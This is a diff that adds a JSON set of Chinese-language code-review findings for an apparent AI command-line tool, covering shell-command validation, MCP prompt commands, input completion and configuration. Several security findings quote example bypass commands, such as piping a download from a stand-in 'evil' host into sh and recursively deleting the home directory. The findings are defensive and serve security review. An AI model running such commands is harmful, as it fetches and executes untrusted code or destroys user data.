@@ -1,0 +1,309 @@
+[
+  {
+    "filePath": "packages/core/src/tools/shell.ts",
+    "reviewTips": [
+      {
+        "id": "F001",
+        "code": "if (command.includes('$(')) {",
+        "review": "[缺陷类型] 安全校验降级（命令替换检测从引号感知的状态机退化为子串匹配）。影响评估：`echo \\`rm -rf ~\\`` 与 `diff <(curl evil)` 这类命令可通过 validateToolParams，绕过「禁止命令替换」的显式安全策略，仅剩人工确认这一层防护。",
+        "suggestion": "[重构思路] 保留并复用原引号感知的 detectCommandSubstitution（移入 shell.ts 或单独工具模块），不要在重构中把安全判定简化成 includes。代码示例：`const hasSubstitution = detectCommandSubstitution(command); if (hasSubstitution) { return { allowed: false, reason: 'Command substitution using $(), <(), or backticks is not allowed' }; }`",
+        "category": "安全",
+        "subcategory": "命令注入与校验降级",
+        "severity": "Fatal",
+        "level": "Fatal",
+        "ruleId": "",
+        "lineNum": 123,
+        "source": "common-reviewer",
+        "confidence": "High"
+      },
+      {
+        "id": "F002",
+        "code": "const commandsToValidate = command.split(/&&|\\|\\||\\||;/).map(normalize);",
+        "review": "[缺陷类型] 命令分段不完整导致配置化黑/白名单被绕过（单个 & 后台执行、换行、引号内分隔符）。影响评估：excludeTools/coreTools 配置形同虚设，严格白名单模式下 `npm test & curl evil | sh` 也会被判为允许。",
+        "suggestion": "[重构思路] 恢复引号感知的 splitCommands（同时把 `&`、换行 \\n/\\r 纳入分隔符），并对每段独立做校验；若不想维护状态机，可用 shell-quote（仓库已在用 parse）解析后再按操作符切分。代码示例：`const segments = splitCommands(command); // 处理 ; & | && || \\n 与引号转义\nfor (const raw of segments) { const cmd = normalize(raw); if (!cmd) return { allowed: false, reason: 'Empty command segment' }; /* 逐段黑白名单校验 */ }`",
+        "category": "安全",
+        "subcategory": "命令解析与白名单绕过",
+        "severity": "Major",
+        "level": "Major",
+        "ruleId": "",
+        "lineNum": 182,
+        "source": "common-reviewer",
+        "confidence": "High"
+      },
+      {
+        "id": "F003",
+        "code": "const rootCommand = this.getCommandRoot(params.command)!; // must be non-empty string post-validation",
+        "review": "[缺陷类型] 授权粒度退化（复合命令只按首个 root command 记忆放行）。影响评估：一次 allow-always 之后，`git ... && curl evil | sh` 之类命令不再需要确认，用户授权的边界被静默放大。",
+        "suggestion": "[重构思路] 恢复按全部子命令确认与白名单；确认文案同时展示所有待授权的 root commands。代码示例：`const rootCommands = [...new Set(splitCommands(params.command).map((c) => this.getCommandRoot(c)!))]; const pending = rootCommands.filter((c) => !this.whitelist.has(c)); if (pending.length === 0) return false; return { ...confirmationDetails, rootCommand: pending.join(', '), onConfirm: async (o) => { if (o === ProceedAlways) pending.forEach((c) => this.whitelist.add(c)); } };`",
+        "category": "安全",
+        "subcategory": "授权范围放大",
+        "severity": "Major",
+        "level": "Major",
+        "ruleId": "",
+        "lineNum": 262,
+        "source": "common-reviewer",
+        "confidence": "High"
+      },
+      {
+        "id": "F004",
+        "code": "getCommandRoot(command: string): string | undefined {",
+        "review": "[缺陷类型] 命令根解析退化 + 移除 shell 包装剥离，导致对 bash/sh 的授权等价于无限制执行。影响评估：用户在 `bash -c 'curl ... | sh'` 上点 allow-always 后，解释器入口被永久放行。",
+        "suggestion": "[重构思路] 恢复引号感知的 getCommandRoot 与 stripShellWrapper：先剥壳再解析，并把 `bash/sh/zsh -c` 这类解释器入口纳入危险命令集合强制每次确认。代码示例：`const inner = stripShellWrapper(params.command); const root = getCommandRoot(inner); if (INTERPRETERS.has(root)) { /* 不进入 whitelist，强制确认 */ }`",
+        "category": "安全",
+        "subcategory": "命令根解析与解释器放行",
+        "severity": "Major",
+        "level": "Major",
+        "ruleId": "",
+        "lineNum": 105,
+        "source": "common-reviewer",
+        "confidence": "High"
+      }
+    ]
+  },
+  {
+    "filePath": "packages/cli/src/ui/components/InputPrompt.tsx",
+    "reviewTips": [
+      {
+        "id": "F005",
+        "code": "const shouldShowCompletion = useCallback(",
+        "review": "[缺陷类型] 补全激活条件收紧导致功能回归。影响评估：`/mcp `、`/memory ` 等带子命令的 slash 命令无法再列出子命令；新增的 MCP prompt 参数补全完全不可用，属于明显的交互回归。",
+        "suggestion": "[重构思路] 对 slash 命令保留“只要首行以 / 开头且未输入到参数值阶段就激活”的语义，只对 @ 路径补全使用空格门控。代码示例：`const shouldShowCompletion = () => isSlashCommand(buffer.text.trimStart()) ? true : isAtCommand(buffer.text) && isCursorAfterCommandWithoutSpace();`",
+        "category": "可靠性",
+        "subcategory": "输入补全激活条件",
+        "severity": "Major",
+        "level": "Major",
+        "ruleId": "",
+        "lineNum": 98,
+        "source": "common-reviewer",
+        "confidence": "High"
+      },
+      {
+        "id": "F011",
+        "code": "if (!focus) {",
+        "review": "[缺陷类型] 交互能力回归（未聚焦时丢弃 paste 事件）。影响评估：拖拽文件到终端这一被显式支持的用法失效，用户只能先聚焦输入框；与本次同时移除 text-buffer 的 paste 标记相叠加，整个拖拽路径推断能力被削弱。",
+        "suggestion": "[重构思路] 保留未聚焦时的 paste 特例，并让 useKeypress 在未聚焦时也分发 paste。代码示例：`if (!focus && !key.paste) { return; } // 保持 drag-and-drop 支持` 配合 `useKeypress(handleInput, { isActive: true })`",
+        "category": "可靠性",
+        "subcategory": "剪贴板与拖拽粘贴",
+        "severity": "Minor",
+        "level": "Minor",
+        "ruleId": "",
+        "lineNum": 284,
+        "source": "common-reviewer",
+        "confidence": "High"
+      }
+    ]
+  },
+  {
+    "filePath": "packages/cli/src/ui/commands/promptCommands.ts",
+    "reviewTips": [
+      {
+        "id": "F006",
+        "code": "content: JSON.stringify(result.messages[0].content.text),",
+        "review": "[缺陷类型] 数据编码错误（提交前多余 JSON 序列化）+ 多消息丢失。影响评估：所有 MCP prompt 渲染出的提示词都带引号与被转义的 \\n，模板语义失真；含多条 message 的 prompt 只生效第一条。",
+        "suggestion": "[重构思路] 直接提交拼接后的纯文本，并对 content.type 做分支处理。代码示例：`const text = result.messages.filter((m) => m.content.type === 'text').map((m) => m.content.text).join('\\n'); if (!text) { return { type: 'message', messageType: 'error', content: 'Received an empty prompt response.' }; } return { type: 'submit_prompt', content: text };`",
+        "category": "可靠性",
+        "subcategory": "数据编码与内容截断",
+        "severity": "Minor",
+        "level": "Minor",
+        "ruleId": "",
+        "lineNum": 146,
+        "source": "common-reviewer",
+        "confidence": "High"
+      },
+      {
+        "id": "F007",
+        "code": "const prompts = getMCPServerPrompts(serverName) || [];",
+        "review": "[缺陷类型] 异步数据与静态命令注册的时序错配（无刷新机制）。影响评估：多数会话里 MCP prompt 命令根本不出现；一旦出现也只在启动竞态恰好有利时可用，行为不稳定。",
+        "suggestion": "[重构思路] 把 prompt 命令改成动态生成：在命令执行/补全时实时读取 getMCPServerPrompts，或在 MCP 状态变化监听器（addMCPStatusChangeListener）触发后重建 CommandService。代码示例：`addMCPStatusChangeListener(() => rebuildCommands()); // 或注册一个 catch-all SlashCommand，在 action 内按 args 实时查 getMCPServerPrompts(server)`",
+        "category": "可靠性",
+        "subcategory": "注册时序与动态刷新",
+        "severity": "Minor",
+        "level": "Minor",
+        "ruleId": "",
+        "lineNum": 26,
+        "source": "common-reviewer",
+        "confidence": "Medium"
+      },
+      {
+        "id": "F014",
+        "code": "const commandName = `${prompt.name}`;",
+        "review": "[缺陷类型] 命名空间缺失与命令名冲突。影响评估：多 server 场景下命令重复、解析不确定；prompt 名与内置命令撞名时可能遮蔽内置行为，排查成本高。",
+        "suggestion": "[重构思路] 使用 server 前缀（如 `/server:prompt`）或子命令形式（`/prompts <server> <prompt>`），并在注册时检测重名。代码示例：`const commandName = `${serverName}:${prompt.name}`; if (existingNames.has(commandName)) { logger.warn(`Duplicate prompt command ${commandName} ignored`); continue; }`",
+        "category": "可维护",
+        "subcategory": "命令命名与冲突",
+        "severity": "Minor",
+        "level": "Minor",
+        "ruleId": "",
+        "lineNum": 28,
+        "source": "common-reviewer",
+        "confidence": "Medium"
+      }
+    ]
+  },
+  {
+    "filePath": "packages/core/src/tools/mcp-client.ts",
+    "reviewTips": [
+      {
+        "id": "F008",
+        "code": "mcpClient.onerror = (error) => {",
+        "review": "[缺陷类型] 连接生命周期回调缺失（只处理 error 不处理 close）。影响评估：IDE 侧正常退出后 CLI 显示错误的连接状态并继续使用过期文件上下文，用户难以判断集成是否可用。",
+        "suggestion": "[重构思路] 为 IDE server 补齐 onclose 处理，且错误/关闭路径统一走一个清理函数。代码示例：`const onDisconnect = () => { updateMCPServerStatus(mcpServerName, MCPServerStatus.DISCONNECTED); mcpServerPromptsInternal.delete(mcpServerName); if (mcpServerName === IDE_SERVER_NAME) ideContext.clearOpenFilesContext(); }; mcpClient.onerror = onDisconnect; mcpClient.onclose = onDisconnect;`",
+        "category": "可靠性",
+        "subcategory": "连接状态与上下文清理",
+        "severity": "Minor",
+        "level": "Minor",
+        "ruleId": "",
+        "lineNum": 406,
+        "source": "common-reviewer",
+        "confidence": "High"
+      }
+    ]
+  },
+  {
+    "filePath": "packages/core/src/services/loopDetectionService.ts",
+    "reviewTips": [
+      {
+        "id": "F009",
+        "code": "this.partialContent += content;",
+        "review": "[缺陷类型] 累积缓冲区无界增长 + 检测覆盖面收缩（仅 ASCII 句末标点）。影响评估：长输出场景下内存随响应长度线性增长；对不带 .!? 的输出（代码/JSON/中文）内容循环检测完全失效，用户可能收到无尽重复内容。",
+        "suggestion": "[重构思路] 给 partialContent 设上限（超出即截断或强制按窗口切分），并把断句集合扩展到中文标点/换行；保留对不同文本形态的兜底检测。代码示例：`const SENTENCE_END = /[.!?。！？\\n]+(?=\\s|$)/; if (this.partialContent.length > MAX_PARTIAL_LENGTH) { this.partialContent = this.partialContent.slice(-MAX_PARTIAL_LENGTH); }`",
+        "category": "可靠性",
+        "subcategory": "循环检测与内存边界",
+        "severity": "Minor",
+        "level": "Minor",
+        "ruleId": "",
+        "lineNum": 144,
+        "source": "common-reviewer",
+        "confidence": "High"
+      }
+    ]
+  },
+  {
+    "filePath": "packages/cli/src/ui/hooks/useCompletion.ts",
+    "reviewTips": [
+      {
+        "id": "F010",
+        "code": "const relativePath = path.relative(cwd, file);",
+        "review": "[缺陷类型] 跨平台路径分隔符处理回退。影响评估：Windows 用户的 @ 文件补全会插入反斜杠路径，后续目录段补全与 ignore 过滤判定错乱；改为 path.relative 还引入了对 cwd 与 process.cwd() 一致性的隐式依赖。",
+        "suggestion": "[重构思路] 统一在产出建议时归一化为正斜杠，并且对 glob 已相对的结果不要再做 path.relative。代码示例：`const normalize = (p: string) => p.replace(/\\\\/g, '/'); const suggestions = files.map((file) => { const rel = normalize(file); return { label: rel, value: escapePath(rel) }; });`",
+        "category": "可移植",
+        "subcategory": "路径分隔符与平台差异",
+        "severity": "Minor",
+        "level": "Minor",
+        "ruleId": "",
+        "lineNum": 396,
+        "source": "common-reviewer",
+        "confidence": "High"
+      }
+    ]
+  },
+  {
+    "filePath": "packages/cli/src/ui/components/shared/text-buffer.ts",
+    "reviewTips": [
+      {
+        "id": "F012",
+        "code": "ch = `@${potentialPath}`;",
+        "review": "[缺陷类型] 交互细节回归（缺少分隔空格）。影响评估：拖拽插入的 @ 文件引用与其后输入粘连，产生无效引用与补全抖动，用户需手动补空格。",
+        "suggestion": "[重构思路] 恢复尾随空格。代码示例：`if (isValidPath(unescapePath(potentialPath))) { ch = `@${potentialPath} `; }`",
+        "category": "可靠性",
+        "subcategory": "@ 引用插入格式",
+        "severity": "Minor",
+        "level": "Minor",
+        "ruleId": "",
+        "lineNum": 1045,
+        "source": "common-reviewer",
+        "confidence": "High"
+      }
+    ]
+  },
+  {
+    "filePath": "packages/cli/src/config/config.ts",
+    "reviewTips": [
+      {
+        "id": "F013",
+        "code": "if (mcpServers[IDE_SERVER_NAME]) {",
+        "review": "[缺陷类型] 保留名校验只告警不生效，日志与行为不一致。影响评估：用户配置的同名 server 可能被真实连接并向 IDE 上下文注入数据（伪造 activeFile），同时用户被日志误导以为已被忽略。",
+        "suggestion": "[重构思路] 先无条件剔除保留名再按需注入。代码示例：`if (mcpServers[IDE_SERVER_NAME]) { logger.warn(...); delete mcpServers[IDE_SERVER_NAME]; } if (!ideMode) { /* 同样剔除，避免非 IDE 模式下被伪造 */ }`",
+        "category": "可靠性",
+        "subcategory": "配置保留名处理",
+        "severity": "Minor",
+        "level": "Minor",
+        "ruleId": "",
+        "lineNum": 359,
+        "source": "common-reviewer",
+        "confidence": "High"
+      }
+    ]
+  },
+  {
+    "filePath": "packages/cli/src/validateNonInterActiveAuth.ts",
+    "reviewTips": [
+      {
+        "id": "F015",
+        "code": "const effectiveAuthType =",
+        "review": "[缺陷类型] 破坏性变更缺少迁移提示。影响评估：使用 GOOGLE_GENAI_USE_GCA / GOOGLE_CLOUD_ACCESS_TOKEN 的既有自动化在升级后直接失败或改用不同认证方式，错误信息未提示该变量已被移除。",
+        "suggestion": "[重构思路] 若确需下线，至少在检测到旧变量时给出明确的弃用/迁移报错，并在 release note 说明替代方案（settings 中的 auth 配置或 GEMINI_API_KEY / GOOGLE_GENAI_USE_VERTEXAI）。代码示例：`if (process.env.GOOGLE_GENAI_USE_GCA) { console.error('GOOGLE_GENAI_USE_GCA is no longer supported; please set an auth method in settings or use GEMINI_API_KEY / GOOGLE_GENAI_USE_VERTEXAI.'); process.exit(1); }`",
+        "category": "可靠性",
+        "subcategory": "认证兼容性",
+        "severity": "Minor",
+        "level": "Minor",
+        "ruleId": "",
+        "lineNum": 15,
+        "source": "common-reviewer",
+        "confidence": "Medium"
+      }
+    ]
+  },
+  {
+    "filePath": "esbuild.config.js",
+    "reviewTips": [
+      {
+        "id": "F016",
+        "code": "define: {",
+        "review": "[缺陷类型] 移除既有兼容性补丁而未见说明。影响评估：在 CI=true 等环境下可能出现 UI 不渲染的回归（issue #1563 的症状），且构建产物不再将 is-in-ci 打到指定实现。",
+        "suggestion": "[重构思路] 若依赖版本已修复该问题，请在 MR 描述中给出验证（ink / is-in-ci 版本与验证方式）；否则保留补丁或在代码层显式忽略 CI 检测。代码示例：`// esbuild.config.js\nalias: { 'is-in-ci': path.resolve(__dirname, 'packages/cli/src/patches/is-in-ci.ts') }`",
+        "category": "可靠性",
+        "subcategory": "构建与运行环境兼容",
+        "severity": "Minor",
+        "level": "Minor",
+        "ruleId": "",
+        "lineNum": 24,
+        "source": "common-reviewer",
+        "confidence": "Medium"
+      },
+      {
+        "id": "F017",
+        "code": "const __filename = fileURLToPath(import.meta.url);",
+        "review": "[缺陷类型] 未使用变量残留。影响评估：lint 告警与阅读噪音，属清理项。",
+        "suggestion": "[重构思路] 删除 __filename，或直接用 `const __dirname = path.dirname(fileURLToPath(import.meta.url));`。代码示例：`const __dirname = path.dirname(fileURLToPath(import.meta.url));`",
+        "category": "可读性",
+        "subcategory": "死代码清理",
+        "severity": "Suggestion",
+        "level": "Suggestion",
+        "ruleId": "",
+        "lineNum": 12,
+        "source": "common-reviewer",
+        "confidence": "High"
+      }
+    ]
+  },
+  {
+    "filePath": "packages/cli/src/ui/commands/mcpCommand.ts",
+    "reviewTips": [
+      {
+        "id": "F018",
+        "code": "} else {",
+        "review": "[缺陷类型] 文案冗余与不可达分支。影响评估：/mcp 输出对同一状态给出两种描述，易误读；死分支增加维护负担。",
+        "suggestion": "[重构思路] 计数兜底只保留一处语义（例如无工具也无 prompt 时不追加括号信息，由正文统一说明），并去掉恒真的 if (descLines) 判断。代码示例：`const descLines = prompt.description.trim().split('\\n'); message += ':\\n'; for (const line of descLines) { message += `      ${COLOR_GREEN}${line}${RESET_COLOR}\\n`; }`",
+        "category": "可读性",
+        "subcategory": "输出文案与死分支",
+        "severity": "Suggestion",
+        "level": "Suggestion",
+        "ruleId": "",
+        "lineNum": 181,
+        "source": "common-reviewer",
+        "confidence": "Medium"
+      }
+    ]
+  }
+]
